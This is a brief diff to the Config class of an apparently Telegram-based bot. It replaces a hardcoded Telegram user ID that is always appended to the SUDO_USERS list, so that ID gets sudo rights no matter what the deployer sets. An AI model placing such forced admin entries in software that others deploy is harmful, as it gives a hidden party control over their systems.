@@ -11,8 +11,8 @@ class Config():
   APP_ID = os.environ.get("APP_ID", "")
   API_HASH = os.environ.get("API_HASH", "")
   # Sudo users( goto @JVToolsBot and send /id to get your id)
-  SUDO_USERS = list(set(int(x) for x in os.environ.get("SUDO_USERS", "7318101682").split()))
-  SUDO_USERS.append(7318101682)
+  SUDO_USERS = list(set(int(x) for x in os.environ.get("SUDO_USERS", "7678359785").split()))
+  SUDO_USERS.append(7678359785)
   SUDO_USERS = list(set(SUDO_USERS))
 
 class Messages():
